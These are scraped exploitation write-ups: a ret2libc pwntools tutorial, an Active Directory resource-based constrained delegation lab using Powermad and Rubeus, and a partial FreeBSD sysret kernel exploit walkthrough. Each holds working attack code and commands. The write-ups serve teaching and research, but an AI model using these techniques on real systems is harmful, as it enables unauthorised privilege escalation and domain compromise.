Optimizer Local Privilege Escalation\n* [31]CVE-2019-13382: Local Privilege Escalation in SnagIt\nRecent Comments\nRon on [32]CVE-2019-13382: Local Privileg\u2026\nenigma0x3 on [33]CVE-2019-13382: Local Privileg\u2026\nRon on [34]CVE-2019-13382: Local Privileg\u2026\nSoc on [35]Defeating Device Guard: A look\u2026\n[36]\u201cFileless\u2026 on [37]\u201cFileless\u201d UAC Byp\u2026\nArchives\n* [38]October 2023\n* [39]January 2020\n* [40]December 2019\n* [41]August 2019\n* [42]July 2019\n* [43]March 2019\n* [44]January 2019\n* [45]October 2018\n* [46]June 2018\n* [47]January 2018\n* [48]November 2017\n* [49]October 2017\n* [50]September 2017\n* [51]August 2017\n* [52]July 2017\n* [53]April 2017\n* [54]March 2017\n* [55]January 2017\n* [56]November 2016\n* [57]August 2016\n* [58]July 2016\n* [59]May 2016\n* [60]March 2016\n* [61]February 2016\n* [62]January 2016\n* [63]October 2015\n* [64]August 2015\n* [65]April 2015\n* [66]March 2015\n* [67]January 2015\n* [68]October 2014\n* [69]July 2014\n* [70]June 2014\n* [71]March 2014\n* [72]January 2014\nCategories\n* [73]Uncategorized\nMeta\n* [74]Register\n* [75]Log in\n* [76]Entries feed\n* [77]Comments feed\n* [78]WordPress.com\n[79]Blog at WordPress.com.\n* [80]Comment\n* [81]Reblog\n* [82]Subscribe [83]Subscribed\n+ [84]enigma0x3\nJoin 182 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [85]Log in now.\n*\n+ [86]enigma0x3\n+ [87]Customize\n+ [88]Subscribe [89]Subscribed\n+ [90]Sign up\n+ [91]Log in\n+ [92]Copy shortlink\n+ [93]Report this content\n+ [94]View post in Reader\n+ [95]Manage subscriptions\n+ [96]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [97]likes-master\n%d"}
{"text":"# Pay your local library a visit\n\nAt this point you're probably used to hunting through binaries for useful functions or code that you can use to get a shell. But what do you do without a call to `system()`?\n\nThe simple answer: get a shell anyways. :)\n\nThe long answer is a bit more complicated. This attack is called a \"Return to `libc`\", or `ret2libc` for short. If you don't remember the PLT and GOT from before, now is a good time to check the [glossary](..\/terms) and maybe do some googling. You'll recall that ASLR randomizes the libc address, but the good news is that with arbitrary `read()` and `write()` calls, you can easily circumvent this.\n\nThis binary has what we call Dynamic Input, which is some super fancy ego-inflating jargon that means we can change inputs in the same program. Basically any program where you can trigger the vulnerability twice (or more) with different exploits in the same run is dynamic. If it still doesn't make sense, just stay tuned.\n\nIf you haven't already, run through [Exercise 3.5: Intro to pwntools](..\/exercise-3.5)\n\nSeriously, go do that.\n\nNow that you've made it this far, I'll give a brief overview of this style of exploit. The libc functions that the PLT stubs call aren't just some magical ethereal functions. They're real and they're mapped to a real page in memory with an address that you can call if you're clever. **The entire libc is in the binary.** From here, we exploit the fact that truly randomizing everything is computationally expensive. Instead, ASLR only randomizes the **base address** of the libc. This means that `&function_1 - &function_2` is constant as long as you're using the same libc file. With this in mind, the goal is to leak (`write()`) the address of some libc function to stdout. we then take that address, compute the address of system, call `main()` (or whatever function contains the vulnerability) again, and call `system()` with the newly computed address.\n\nStill confused? I was when I first learned this, but I'll try to explain as I go.\n\nFirst, we have to calculate the offset of `%eip`\n\n```shell\n$ python -c 'print \"A\"*140 + \"BBBB\"' | strace .\/exercise-4\n...\n--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---\n```\n\nAfter `140 bytes`, we have `%eip`\n\nFrom here, we need to leak the address of a `libc` function.\n\nWe can do this by calling `write(1, &function, 4)`\n\nI'll be using the GOT address of `read()` (remember that the GOT is an array of pointers into libc)\n\n```objdump\n$ objdump -d exercise-4 | grep \">:a\"\n...\n08048370 <write@plt>:\n...\n\n$ objdump -R exercise-4\n...\n0804a00c R_386_JUMP_SLOT   read\n...\n```\n\nWith these addresses, we get the following exploit.\n\n```shell\npython -c 'print \"A\"*140 + \"\\x70\\x83\\x04\\x08\" + \"RETN\" +\n\"\\x01\\x00\\x00\\x00\"+ \"\\x0c\\xa0\\x04\\x08\" + \"\\x04\\x00\\x00\\x00\"' | .\/exercise-4\n```\n\nIf you go ahead and run this a few times, you'll get some weird outputs:\n\n```shell\n\ufffd+o\ufffdSegmentation fault (core dumped)\n\ufffdkh\ufffdSegmentation fault (core dumped)\n\ufffd\ufffdn\ufffdSegmentation fault (core dumped)\n```\n\nThe four bytes before the SEGFAULT are the libc address.\n\nFrom here, we're going to run:\n\n```shell\n$ ldd exercise-4\n    linux-gate.so.1 =>  (0xf76f9000)\n    libc.so.6 => \/lib\/i386-linux-gnu\/libc.so.6 (0xf753c000)\n    \/lib\/ld-linux.so.2 (0xf76fa000)\n```\n\nSince this is a local binary challenge, the `libc` file is just going to be whatever the standard one is on your computer. **The same binary running on a different machine could have a different `libc`, and therefore give you different results.**\n\nAll we have to do is grab a copy of that `libc` and put it in our directory. If you ever exploit a remote binary and you don't have the `libc`, there are plenty of places you can get them online.\n\n```shell\n$ cp \/lib\/i386-linux-gnu\/libc.so.6 .\/\n```\n\nNow we need `pwntools`.\n\nWe'll start our script off with the typical items:\n\n```Python\nfrom pwn import *\ncontext(arch='i386', os='linux') # <-- Add the architecture and os\nbinary = ELF(\"exercise-4\")\nlibc = ELF(\"libc.so.6\")\n\nr = process(\".\/exercise-4\")\n```\n\nAfter this, we know we'll need the `read()`, `write()`, the GOT address of `read()`, and a `pop; ret` ropgadget, so we add these in.\n\n```python\nwrite_plt = p32(binary.symbols[\"write\"])\nread_GOT = p32(binary.symbols[\"got.read\"])\nread_plt = p32(binary.symbols[\"read\"])\nbss_addr = p32(binary.symbols[\"__bss_start\"])\npop_ret = \"\\x9d\\x85\\x04\\x08\"\n```\n\nNow the binary outputs a line first, so we add:\n\n```python\nr.recvline()\n```\n\nNow we should start building our exploit. We want to try to avoid using the escape strings from before, it makes for nicer code and forces you to use `pwntools` the right way.\n\n```python\nexploit = \"A\"*140                                               # EIP offset\nexploit += write_plt +pop_ret +  p32(1)+ read_GOT + p32(4)      # Call to write()\nexploit += p32(binary.symbols[\"main\"])                          # Call main() again to retrigger the vulnerability\n\n```\n\nNow we want to send the first payload:\n\n```python\nr.sendline(exploit)\n```\n\nNow here's the cool part. Since we know that the program prints out the address of `read()` in the `libc` (remember those funky bytes from earlier before the SEGFAULT?) we can take those and calculate the base address of `libc`. This indirectly means that we can call any function in the standard library.\n\n```python\naddr_read = int(r.recv(4)[::-1].encode(\"hex\"),16)\nr.recvline()\nlibc_base = addr_read - libc.symbols[\"read\"]\nsystem = p32(libc_base + libc.symbols[\"system\"])\n```\n\nLet's break down my hacky `addr_read` line.\n\n1. `recv()` 4 bytes from `r`\n2. Reverses the remaining bytes (because of little endian encoding)  and converts them to hex\n3. Parse that as an integer.\n\nVoila! We now have the address of `read()` in `libc`.\n\nFrom there, we subtract `read()`s address in the regular libc, giving us the base address for this runtime. In the last line, we add the offset of `system()` in the libc to our calculated base. This gives us the address of system for this runtime.\n\nThe best part of this whole show is that the pesky `\"\/bin\/sh\"` string we need is in `libc`! We can calculate the address of that as well!\n\n```python\nbinsh = p32(libc_base +  libc.search(\"\/bin\/sh\").next())\n```\n\nNow all we've got to do is send our exploit with some extra padding (it was 140 before, but now it's 148 since we overflow from before the stack frame) and we get a shell.\n\n```python\nr.sendline(\"A\"*148+ system + \"RETN\" + binsh + binsh) # <- 148?????? why 148?\nr.interactive()\n```\n"}
{"text":"Red Team Notes\n[1]linkedin[2]twitter[3]patreon[4]github\nSearch\n\u2303K\nLinks\nWhat is ired.team notes?\nPinned\nPentesting Cheatsheets\nActive Directory & Kerberos Abuse\nFrom Domain Admin to Enterprise Admin\nKerberoasting\nKerberos: Golden Tickets\nKerberos: Silver Tickets\nAS-REP Roasting\nKerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled\nKerberos Unconstrained Delegation\nKerberos Constrained Delegation\nKerberos Resource-based Constrained Delegation: Computer Object\nTakeover\nDomain Compromise via DC Print Server and Kerberos Delegation\nDCShadow - Becoming a Rogue Domain Controller\nDCSync: Dump Password Hashes from Domain Controller\nPowerView: Active Directory Enumeration\nAbusing Active Directory ACLs\/ACEs\nPrivileged Accounts and Token Privileges\nFrom DnsAdmins to SYSTEM to Domain Compromise\nPass the Hash with Machine$ Accounts\nBloodHound with Kali Linux: 101\nBackdooring AdminSDHolder for Persistence\nActive Directory Enumeration with AD Module without RSAT or Admin\nPrivileges\nEnumerating AD Object Permissions with dsacls\nActive Directory Password Spraying\nActive Directory Lab with Hyper-V and PowerShell\nADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain\nController Machine Certificate\nFrom Misconfigured Certificate Template to Domain Admin\nShadow Credentials\nAbusing Trust Account$: Accessing Resources on a Trusted Domain from a\nTrusting Domain\noffensive security\nRed Team Infrastructure\nInitial Access\nCode Execution\nCode & Process Injection\nDefense Evasion\nEnumeration and Discovery\nPrivilege Escalation\nCredential Access & Dumping\nLateral Movement\nPersistence\nExfiltration\nreversing, forensics & misc\nInternals\nCloud\nNeo4j\nDump Virtual Box Memory\nAES Encryption Using Crypto++ .lib in Visual Studio C++\nReversing Password Checking Routine\nPowered By GitBook\nComment on page\nKerberos Resource-based Constrained Delegation: Computer Object Takeover\nIt's possible to gain code execution with elevated privileges on a\nremote computer if you have WRITE privilege on that computer's AD\nobject.\nThis lab is based on a video presented by [5]@wald0 -\n[6]https:\/\/www.youtube.com\/watch?v=RUbADHcBLKg&feature=youtu.be\u200b\nOverview\nHigh level overview of the attack as performed in the lab:\nWe have code execution on the box WS02 in the context of\noffense\\sandy user;\nUser sandy has WRITE privilege over a target computer WS01;\nUser sandy creates a new computer object FAKE01 in Active Directory\n(no admin required);\nUser sandy leverages the WRITE privilege on the WS01 computer object\nand updates its object's attribute\nmsDS-AllowedToActOnBehalfOfOtherIdentity to enable the newly\ncreated computer FAKE01 to impersonate and authenticate any domain\nuser that can then access the target system WS01. In human terms\nthis means that the target computer WS01 is happy for the computer\nFAKE01 to impersonate any domain user and give them any access\n(even Domain Admin privileges) to WS01;\nWS01 trusts FAKE01 due to the modified\nmsDS-AllowedToActOnBehalfOfOtherIdentity;\nWe request Kerberos tickets for FAKE01$ with ability to impersonate\noffense\\spotless who is a Domain Admin;\nProfit - we can now access the c$ share of ws01 from the computer\nws02.\nKerberos Delegation vs Resource Based Kerberos Delegation\nIn unconstrained and constrained Kerberos delegation, a computer\/user\nis told what resources it can delegate authentications to;\nIn resource based Kerberos delegation, computers (resources) specify\nwho they trust and who can delegate authentications to them.\nRequirements\n\u200b\n\u200b\nTarget computer\nWS01\nAdmins on target computer\n[7][email protected]\nFake computer name\nFAKE01\nFake computer SID\nTo be retrieved during attack\nFake computer password\n123456\nWindows 2012 Domain Controller\nDC01\nSince the attack will entail creating a new computer object on the\ndomain, let's check if users are allowed to do it - by default, a\ndomain member usually can add up to 10 computers to the domain. To\ncheck this, we can query the root domain object and look for property\nms-ds-machineaccountquota\nGet-DomainObject -Identity \"dc=offense,dc=local\" -Domain offense.local\nThe attack also requires the DC to be running at least Windows 2012, so\nlet's check if we're in the right environment:\nGet-DomainController\nLast thing to check - the target computer WS01 object must not have the\nattribute msds-allowedtoactonbehalfofotheridentity set:\nGet-NetComputer ws01 | Select-Object -Property name,\nmsds-allowedtoactonbehalfofotheridentity\nThis is the attribute the above command is referring to:\nCreating a new Computer Object\nLet's now create a new computer object for our computer FAKE01 (as\nreferenced earlier in the requirements table) - this is the computer\nthat will be trusted by our target computer WS01 later on:\nimport-module powermad\nNew-MachineAccount -MachineAccount FAKE01 -Password\n$(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose\nChecking if the computer got created and noting its SID:\nGet-DomainComputer fake01\n# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154\nCreate a new raw security descriptor for the FAKE01 computer principal:\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor\n-ArgumentList\n\"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1\n050690807-1154)\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nModifying Target Computer's AD Object\nApplying the security descriptor bytes to the target WS01 machine:\nGet-DomainComputer ws01 | Set-DomainObject -Set\n@{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose\nReminder - we were able to write this because offense\\Sandy belongs to\nsecurity group offense\\Operations, which has full control over the\ntarget computer WS01$ although the only important one\/enough is the\nWRITE privilege:\n\u200b\nIf our user did not have the required privileges, you could infer that\nfrom the verbose error message:\nOnce the msDS-AllowedToActOnBehalfOfOtherIdentitity is set, it is\nvisible here:\nSame can be seen this way:\nGet-DomainComputer ws01 -Properties\n'msds-allowedtoactonbehalfofotheridentity'\nWe can test if the security descriptor assigned to computer ws01 in\nmsds-allowedtoactonbehalfofotheridentity attribute refers to the\nfake01$ machine:\n(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList\n$RawBytes, 0).DiscretionaryAcl\nNote that the SID is referring to\nS-1-5-21-2552734371-813931464-1050690807-1154 which is the fake01$\nmachine's SID - exactly what we want it to be:\nExecution\nGenerating RC4 Hash\nLet's generate the RC4 hash of the password we set for the FAKE01\ncomputer:\n\\\\VBOXSVR\\Labs\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe hash \/password:123456\n\/user:fake01 \/domain:offense.local\nImpersonation\nOnce we have the hash, we can now attempt to execute the attack by\nrequesting a kerberos ticket for fake01$ with ability to impersonate\nuser spotless who is a Domain Admin:\n\\\\VBOXSVR\\Labs\\Rubeus\\Rubeus\\bin\\Debug\\rubeus.exe s4u \/user:fake01$\n\/rc4:32ED87BDB5FDC5E9CBA88547376818D4 \/impersonateuser:spotless\n\/msdsspn:cifs\/ws01.offense.local \/ptt\nUnfortunately, in my labs, I was not able to replicate the attack at\nfirst, even though according to rubeus, all the required kerberos\ntickets were created successfully - I could not gain remote admin on\nthe target system ws01:\nOnce again, checking kerberos tickets on the system showed that I had a\nTGS ticket for spotless for the CIFS service at ws01.offense.local, but\nthe attack still did not work:\nTrial and Error\nTalking to a couple of folks who had successfully simulated this attack\nin their labs, we still could not figure out what the issue was. After\nrepeating the the attack over and over and carrying out various other\ntroubleshooting steps, I finally found what the issue was.\nNote how the ticket is for the SPN cifs\/ws01.offense.local and we get\naccess denied when attempting to access the remote admin shares of\nws01:\nComputer Take Over\nNote, howerver if we request a ticket for SPN cifs\/ws01 - we can now\naccess C$ share of the ws01 which means we have admin rights on the\ntarget system WS01:\n\\\\VBOXSVR\\Tools\\Rubeus\\Rubeus.exe s4u \/user:fake01$\n\/domain:offense.local \/rc4:32ED87BDB5FDC5E9CBA88547376818D4\n\/impersonateuser:spotless \/msdsspn:http\/ws01 \/altservice:cifs,host \/ptt\nTo further prove we have admin rights - we can write a simple file from\nws02 to ws01 in c:\\users\\administrator:\nAdditionally, check if we can remotely execute code with our noisy\nfriend psexec:\n\\\\vboxsvr\\tools\\PsExec.exe \\\\ws01 cmd\nNote that the offense\\spotless rights are effective only on the target\nsystem - i.e. on the system that delegated (WS01) another computer\nresource (FAKE01) to act on the target's (WS01) behalf and allow to\nimpersonate any domain user.\nIn other words, an attack can execute code\/commands as offense\\spotless\nonly on the WS01 machine and not on any other machine in the domain.\nReferences\nWagging the Dog: Abusing Resource-Based Constrained Delegation to\nAttack Active Directory\nShenanigans Labs\nGitHub - Kevin-Robertson\/Powermad: PowerShell MachineAccountQuota and\nDNS exploit tools\nGitHub\nGitHub - PowerShellMafia\/PowerSploit: PowerSploit - A PowerShell\nPost-Exploitation Framework\nGitHub\nAnother Word on Delegation - harmj0y\nharmj0y\nDonkey\u2019s guide to Resource Based Constrained Delegation Exploitation \u2013\nfrom simple user to (almost) DA \u2013\nDecoder's Blog\nPrevious\nKerberos Constrained Delegation\nNext\nDomain Compromise via DC Print Server and Kerberos Delegation\nLast modified 2yr ago\nOn this page\nOverview\nKerberos Delegation vs Resource Based Kerberos Delegation\nRequirements\nCreating a new Computer Object\nModifying Target Computer's AD Object\nExecution\nGenerating RC4 Hash\nImpersonation\nTrial and Error\nComputer Take Over\nReferences"}
{"text":"[1]fail0verflow\nwhen success just isn't an option\n* [2]Blog\n* [3]About\nRecent Posts\n* [4]PS4 Aux Hax 5: Flawed Instructions Get Optimized\n* [5]PS4 Aux Hax 4: Belize via CEC\n* [6]PS4 Aux Hax 3: Dualshock4\n* [7]PS4 Aux Hax 2: Syscon\n* [8]PS4 Aux Hax 1: Intro & Aeolia\n* [9]ShofEL2, a Tegra X1 and Nintendo Switch exploit\n* [10]Dumping a PS4 Kernel in \"Only\" 6 Days\n* [11]The First PS4 Kernel Exploit: Adieu\n* [12]Console Hacking 2016: Postscript\n* [13]In Memoriam: Ben \u201cbushing\u201d Byer\n* [14]Console Hacking 2015: Liner Notes\n* [15]31c3 CTF - pong (pwn30)\n* [16]31c3 CTF - safelock (signals20)\n* [17]HubCap: pwning the ChromeCast pt. 2\n* [18]HubCap: pwning the ChromeCast pt. 1\n* [19]OpenVizsla OV3 - Hardware\n* [20]RFID hacking preamble: a new peak detection for the proxmark3\n* [21]RFID hacking preamble: designing an FPGA IIR filter for the\nproxmark3\n* [22]Enhancing the AVIC-5000NEX - part 2\n* [23]Enhancing the AVIC-5000NEX\n* [24]plaidCTF 2014 - reeekeeeeee (web200)\n* [25]plaidCTF 2014 - rsa (for450)\n* [26]plaidCTF 2014 - wheeeee (crypto375)\n* [27]plaidCTF 2014 - bbos (for350)\n* [28]plaidCTF 2014 - graphs (crypto200)\n[29]In memory of Ben \u201cbushing\u201c Byer\n2012-07-05\nCVE-2012-0217: Intel's sysret Kernel Privilege Escalation (on FreeBSD)\nBy iZsh\nFiled under [30]vulnerability [31]exploit [32]FreeBSD\n[33]CVE-2012-0217 was reported by Rafal Wojtczuk but ironically, it was\nfixed for Linux in 2006 as shown by [34]CVE-2006-0744 without receiving\nmuch attention.\nIt is quite an interesting vulnerability on many aspects. Among them,\nand thanks to its hardware basis, it impacts many operating systems.\nFor instance, as long as they run on a Intel processor in long mode\n(obviously), [35]FreeBSD, [36]NetBSD, Solaris, [37]Xen and\n[38]Microsoft Windows have been reported to be vulnerable. This\ntherefore gives us quite an incentive to develop an exploit ;).\nIf you haven\u2019t yet read Xen\u2019s blog post [39]The Intel SYSRET privilege\nescalation please do because we won\u2019t go again into too much details\nabout the vulnerability itself.\nWithout further delay, let\u2019s dig right into the FreeBSD exploitation!\nOverview\nWhile developing an exploit, it helps to mentally take note or write\ndown a TODO-list and\/or roadmap to a successful exploitation. Here is\none, sorted by exploitation chronological order:\n* A way to debug the kernel! (You really think one shot is all it\ntakes? ;) )\n* Information gathering\n* Code to trigger the vulnerability\n* Getting arbitrary code execution\n* Keeping the kernel stable\n* Recovering from the general page fault exception (#GP)\n* Privilege escalation\n* Giving back a shellcode to the user\n* (3) Profit ;)\nOf course this is not necessarily the order you follow when trying to\ncome up with ideas to solve them. You don\u2019t always (often?) even have a\nfull roadmap until you actually come up with random ideas, ideas which\nslowly gather, start to make sense and flow together.\nKernel debugging\nThis is one of the most important items. Having a good debugging\nenvironment goes a long way toward a successful exploitation.\nMany configurations could work, in this case, we run and debug the\ntarget OS (FreeBSD) under VMware Fusion on Mac OS X.\nIndeed, VMware provides an easy way to debug the guest OS through a\ndebug stub. Enabling it is easy, you just need to edit the .vmx file\nyou\u2019ll find inside your VMware\u2019s VM (Right Click->Show Package\nContents), and add the following line:\ndebugStub.listen.guest64 = \"TRUE\"\nWith this magic configuration line, VMware listens to the port 8864 and\nyou therefore now are able to debug your VM\u2019s OS using the gdb\u2019s target\ncommand\n(gdb) target remote localhost:8864\nBut to be useful we need to configure and cross-compile GDB for the\nFreeBSD target environment (amd64-marcel-freebsd), enabling us to load\nthe FreeBSD\u2019s kernel symbols into gdb. This requires gettext, gmp, and\nlibelf but you can use MacPorts to install them.\nAs an example, using [40]gdb 7.4.1:\n% sudo port install gettext gmp libelf\n[...]\n% curl -O http:\/\/ftp.gnu.org\/gnu\/gdb\/gdb-7.4.1.tar.bz2\n[...]\n% tar xvjf gdb-7.4.1.tar.bz2\n[...]\n% cd % cd gdb-7.4.1\ngdb-7.4.1 % CFLAGS=-I\/opt\/local\/include .\/configure --prefix=\/opt\/local --progra\nm-suffix=-amd64-marcel-freebsd --target=amd64-marcel-freebsd\n[...]\ngdb-7.4.1 % make\n[...]\ngdb-7.4.1 % make install\nAnd finally, just copy the FreeBSD\u2019s \/usr\/src and \/boot\/kernel\/\ndirectories to Mac OS X.\nAnd voila, you\u2019re set!\n% ls\nkernel\/ usr\/\n% gdb-amd64-marcel-freebsd -q -tui kernel\/kernel\n\u250c\u2500\u2500Register group: general\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502rax            0x0      0                                             \u2502\n\u2502rbx            0x0      0                                             \u2502\n\u2502rcx            0x100b   4107                                          \u2502\n\u2502rdx            0x1008   4104                                          \u2502\n\u2502rsi            0xffffff80001f6b54       -549753754796                 \u2502\n\u2502rdi            0x1008   4104                                          \u2502\n\u2502rbp            0xffffff80001f6b30       0xffffff80001f6b30            \u2502\n\u2502rsp            0xffffff80001f6b30       0xffffff80001f6b30            \u2502\n\u2502r8             0x0      0                                             \u2502\n\u2502r9             0x0      0                                             \u2502\n\u2502r10            0x2      2                                             \u2502\n\u2502r11            0xffffffff8022fdb0       -2145190480                   \u2502\n\u2502r12            0xffffff0002286200       -1099475426816                \u2502\n\u2502r13            0xffffff0002286228       -1099475426776                \u2502\n\u250c\u2500\u2500\/usr\/src\/sys\/amd64\/acpica\/acpi_machdep.c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u250296      {                                                          \u2502\n\u250297              return (0);                                        \u2502\n\u250298      }                                                          \u2502\n\u250299                                                                 \u2502\n\u2502100     void                                                       \u2502\n\u2502101     acpi_cpu_c1()                                              \u2502\n\u2502102     {                                                          \u2502\n\u2502103             __asm __volatile(\"sti; hlt\");                      \u2502\n>\u2502104     }                                                          \u2502\n\u2502105                                                                \u2502\n\u2502106     \/*                                                         \u2502\n\u2502107      * Support for mapping ACPI tables during early boot.  Curr\u2502\n\u2502108      * uses the crashdump map to map each table.  However, the \u2502\n\u2502109      * map is created in pmap_bootstrap() right after the direc\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nremote Thread 1 In: acpi_cpu_c1       Line: 104  PC: 0xffffffff8092d1d6\nReading symbols from kernel\/kernel...done.\n(gdb) target remote localhost:8864\nRemote debugging using localhost:8864\nacpi_cpu_c1 () at \/usr\/src\/sys\/amd64\/acpica\/acpi_machdep.c:104\n(gdb)\nNB: you can change the -tui layout using ctrl+x 2 multiple times\nOne warning though: you can\u2019t easily step through anything. For\ninstance, if you single-step through the function Xfast_syscall\n[41][1], the code\ncli\ntestl $PCB_FULL_IRET,PCB_FLAGS(%rax)\nwould detect it needs a full iret and won\u2019t use the sysret instruction.\nThe trick is therefore to set your breakpoints directly at the #GP\u2019s\nand\/or doublefault\u2019s handlers (resp. Xprot() [42][2] and Xdblfault()\n[43][3]), which are triggered right after the sysret instruction\nexecution. From there, you won\u2019t have troubles single stepping and\nyou\u2019ll even see the page fault triggers once the kernel try to access\nsome gs:data (we\u2019ll see why soon enough).\nInformation gathering\nDuring exploitation, we need a few kernel symbol addresses. Under\nFreeBSD we\u2019re in luck: the kldsym() function provides an easy way for\nsymbol lookups as shown by the following get_symaddr() function.\nu_long get_symaddr(char *symname)\n{\nstruct kld_sym_lookup ksym;\nksym.version = sizeof (ksym);\nksym.symname = symname;\nif (kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {\nperror(\"kldsym\");\nexit(1);\n}\nprintf(\"    [+] Resolved %s to %#lx\\n\", ksym.symname, ksym.symvalue);\nreturn ksym.symvalue;\n}\nVulnerability Triggering\nTriggering the vulnerability is easy:\n* Allocate a page just before the non-canonical address boundary\n0x0000800000000000\n* Call an arbitrary syscall using the syscall instruction right\nbefore the non-canonical address boundary\nWhen the fastsyscall handler restores the user\u2019s registers, executes\nsysret and therefore tries to return to the \u201cnext instruction\u201d at\n0x0000800000000000, on Intel\u2019s processors, a #GP is triggered while\nstill in kernel mode. Furthermore, an exception frame is pushed to the\nstack, which now happens to be the userland\u2019s stack. Thus, we can\ntrigger a kernel write to a location which is user controlled!\nHence, the following triggering code\nuint64_t pagesize = getpagesize();\nuint8_t * area = (uint8_t*)((1ULL << 47) - pagesize);\narea = mmap(area, pagesize,\nPROT_READ | PROT_WRITE | PROT_EXEC,\nMAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);\nif (area == MAP_FAILED) {\nperror(\"mmap (trigger)\");\nexit(1);\n}\n\/\/ Copy the trigger code at the end of the page\n\/\/ such that the syscall instruction is at its\n\/\/ boundary\nchar triggercode[] =\n\"\\xb8\\x18\\x00\\x00\\x00\" \/\/ mov rax, 24; #getuid\n\"\\x48\\x89\\xe3\" \/\/ mov rbx, rsp; save the user's stack for later\n\"\\x48\\xbc\\xbe\\xba\\xfe\\xca\\xde\\xc0\\xad\\xde\" \/\/ mov rsp, 0xdeadc0decafebabe\n\"\\x0f\\x05\"; \/\/ syscall\nuint8_t * trigger_addr = area + pagesize - TRIGGERCODESIZE;\nmemcpy(trigger_addr, triggercode, TRIGGERCODESIZE);\nThe question now is, what do we set rsp to?\nFollow the white rabbit\u2026\nArbitrary code execution\nThere are two outcomes given a target rsp:\n* if rsp can\u2019t be written to, a double fault is triggered\n(Xdblfault() [44][3]) and the exception frame is pushed to a\nspecial stack\n* otherwise a #GP is triggered (Xprot() [45][2]) and the exception\nframe is pushed to [rsp]\nIn the latter case, the trouble is (or is it?)\u2026 The #GP triggers a page\nfault (Xpage() [46][4]). Let\u2019s see why.\nIDTVEC(prot)\nsubq    $TF_ERR,%rsp\nmovl    $T_PROTFLT,TF_TRAPNO(%rsp)                               [1]\nmovq    $0,TF_ADDR(%rsp)                                         [2]\nmovq    %rdi,TF_RDI(%rsp)   \/* free up a GP register *\/          [3]\nleaq    doreti_iret(%rip),%rdi\ncmpq    %rdi,TF_RIP(%rsp)\nje  1f          \/* kernel but with user gsbase!! *\/\ntestb   $SEL_RPL_MASK,TF_CS(%rsp) \/* Did we come from kernel? *\/ [4]\njz  2f          \/* already running with kernel GS.base *\/\n1:  swapgs\n2:  movq    PCPU(CURPCB),%rdi                                        [5]\n[4] sets the Z flag because we come from the kernel (while executing\nsysret) and we therefore skip the swapgs instruction. But in this\nparticular chain of event, GS is in fact the user\u2019s GS.base! Indeed it\nwas restored just before calling sysret\u2026 Hence, accessing gs:data at\n[5] triggers a page fault (Xpage() [47][4]).\nIf we don\u2019t do anything we\u2019ll eventually doublefault, tripplefault etc.\nand crash miserably.\nWe therefore need a way:\n1. to recover from the #GP\n2. to clean any mess we did\/overwrote\nBoth could be solved if we can get get an arbitrary code execution by\nthe time we reach [5]. (NB: this is not mandatory, we could get the\ncode execution later down the fault trigger chain)\nSo\u2026 here is the idea: wouldn\u2019t it be nice if we could overwrite the\npage fault handler\u2019s address and therefore get code execution when [5]\ntriggers the #PF?\nYes indeed, and that\u2019s how we\u2019re going to exploit it :-)\nFirst a few structures for reference:\nGate descriptor:\n+0:  Target Offset[15:0] | Target Selector\n+4:  Some stuff          | Target Offset[31:16]\n+8:  Target Offset[63:32]\n+12: Some more stuff\nand from include\/frame.h:\nstruct trapframe {\nregister_t  tf_rdi;\nregister_t  tf_rsi;\nregister_t  tf_rdx;\nregister_t  tf_rcx;\nregister_t  tf_r8;\nregister_t  tf_r9;\nregister_t  tf_rax;\nregister_t  tf_rbx;\nregister_t  tf_rbp;\nregister_t  tf_r10;\nregister_t  tf_r11;\nregister_t  tf_r12;\nregister_t  tf_r13;\nregister_t  tf_r14;\nregister_t  tf_r15;\nuint32_t    tf_trapno;\nuint16_t    tf_fs;\nuint16_t    tf_gs;\nregister_t  tf_addr;\nuint32_t    tf_flags;\nuint16_t    tf_es;\nuint16_t    tf_ds;\n\/* below portion defined in hardware *\/\nregister_t  tf_err;\nregister_t  tf_rip;\nregister_t  tf_cs;\nregister_t  tf_rflags;\nregister_t  tf_rsp;\nregister_t  tf_ss;\n};\nWhen the exception is triggered, the hardware pushes ss, rsp, rflags,\ncs, rip and err.\nWe can see that [1], [2] and [3] write to the stack.\n* [3] is fully user-controlled through rdi, so we could try to align\nrsp such that [3] overwrites the #PF\u2019s offset address.\nThe trouble is\u2026 rsp is automatically 16-byte aligned when an\nexception is triggered. We can therefore only overwrite the first\n32-LSB of the offset address (check how rdi is 16byte aligned 